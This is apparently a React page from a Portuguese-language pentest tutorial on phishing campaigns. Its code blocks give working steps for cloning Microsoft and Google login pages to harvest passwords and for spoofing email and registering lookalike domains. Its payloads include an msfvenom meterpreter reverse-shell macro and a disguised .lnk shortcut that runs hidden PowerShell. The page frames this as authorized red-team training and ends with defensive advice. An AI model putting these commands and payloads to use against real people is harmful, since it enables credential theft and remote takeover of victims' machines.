import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function Phishing() {
  return (
    <PageContainer
      title="Phishing & Engenharia Social Avançada"
      subtitle="Monte campanhas de phishing profissionais com GoPhish, clone de páginas, payloads por email e pretexting."
      difficulty="intermediario"
      timeToRead="18 min"
    >
      <h2>Phishing em Pentests</h2>
      <p>
        Campanhas de phishing são parte essencial de pentests e Red Team. O objetivo é testar
        a conscientização dos funcionários e a capacidade de detecção da empresa. Ferramentas
        como GoPhish automatizam todo o processo.
      </p>

      <AlertBox type="danger" title="Autorização obrigatória">
        Campanhas de phishing devem ter autorização expressa e escopo definido. Sempre trabalhe
        com o cliente para definir alvos, limites e procedimentos de report.
      </AlertBox>

      <h2>GoPhish — Framework de Phishing</h2>
      <CodeBlock
        title="Instalar e configurar GoPhish"
        code={`# Instalar GoPhish
sudo apt install gophish

# Ou baixar do GitHub
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-*.zip
cd gophish

# Iniciar
sudo ./gophish

# Acessar painel
# https://127.0.0.1:3333
# Login: admin / (senha mostrada no terminal)

# Fluxo do GoPhish:
# 1. Sending Profiles → configurar servidor SMTP
# 2. Landing Pages → criar página de phishing
# 3. Email Templates → criar template do email
# 4. Users & Groups → lista de alvos
# 5. Campaigns → criar e lançar campanha`}
      />

      <h2>Clone de Páginas</h2>
      <CodeBlock
        title="Clonar páginas de login"
        code={`# GoPhish — Import Site
# Landing Pages → New Page → Import Site
# URL: https://login.microsoft.com
# Marcar: Capture Submitted Data
# Marcar: Capture Passwords

# SET (Social Engineering Toolkit)
sudo setoolkit
# 1. Social-Engineering Attacks
# 2. Website Attack Vectors
# 3. Credential Harvester Attack Method
# 4. Site Cloner
# Enter URL: https://accounts.google.com

# httrack — clonar site completo
sudo apt install httrack
httrack https://login.empresa.com -O /tmp/clone/

# wget — clone simples
wget --mirror --convert-links --page-requisites \\
  https://login.empresa.com -P /tmp/clone/

# Servir página clonada
cd /tmp/clone && python3 -m http.server 80`}
      />

      <h2>Templates de Email</h2>
      <CodeBlock
        title="Criar emails convincentes"
        code={`# Elementos de um email de phishing eficaz:
# 1. Remetente confiável (spoofed ou lookalike)
# 2. Assunto urgente
# 3. Conteúdo relevante ao alvo
# 4. Call-to-action claro
# 5. Link/anexo malicioso

# Exemplos de pretextos:
# - "Atualização de segurança obrigatória"
# - "Seu acesso será suspenso em 24h"
# - "Documento compartilhado com você"
# - "Fatura pendente #12345"
# - "Resultado do processo seletivo"

# Verificar se email spoofing é possível
# Verificar SPF
dig txt empresa.com | grep spf

# Verificar DMARC
dig txt _dmarc.empresa.com

# Verificar DKIM
dig txt default._domainkey.empresa.com

# Se não tem SPF/DMARC → spoofing facilitado

# Domínios lookalike (typosquatting)
# empresa.com → enpresa.com
# empresa.com → empresa-corp.com
# empresa.com → empresa.co
# Usar dnstwist para gerar variações
dnstwist empresa.com`}
      />

      <h2>Payloads por Email</h2>
      <CodeBlock
        title="Tipos de payloads"
        code={`# 1. Link para credential harvester
# Email → link → página clonada → captura credenciais

# 2. Macro em documento Office
# Gerar macro com msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f vba-exe

# 3. HTML Smuggling
# JavaScript no HTML que monta e baixa payload no cliente
# Bypass de filtros de email que checam anexos

# 4. Arquivo .lnk (atalho malicioso)
# Cria atalho que executa PowerShell
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\\Users\\Public\\Document.lnk")
$link.TargetPath = "powershell.exe"
$link.Arguments = "-ep bypass -w hidden -c IEX(...)"
$link.IconLocation = "C:\\Windows\\System32\\shell32.dll,1"
$link.Save()

# 5. QR Code phishing (Quishing)
# Gerar QR code apontando para credential harvester
pip install qrcode
python3 -c "import qrcode; qrcode.make('https://phishing.site/login').save('qr.png')"`}
      />

      <h2>Métricas da Campanha</h2>
      <CodeBlock
        title="Analisar resultados"
        code={`# GoPhish Dashboard mostra:
# - Emails enviados
# - Emails abertos (tracking pixel)
# - Links clicados
# - Credenciais submetidas
# - Reports (usuários que reportaram)

# Métricas para o relatório:
# Taxa de abertura: emails abertos / enviados
# Taxa de clique: links clicados / emails abertos
# Taxa de submissão: credenciais / links clicados
# Taxa de report: reports / emails enviados

# Benchmark (médias da indústria):
# Taxa de clique: 15-25%
# Taxa de submissão: 5-15%
# Taxa de report: 2-5%

# Recomendações no relatório:
# - Treinamento de conscientização
# - Simulações periódicas
# - Filtros de email (SPF, DKIM, DMARC)
# - MFA para todos os serviços`}
      />
    </PageContainer>
  );
}
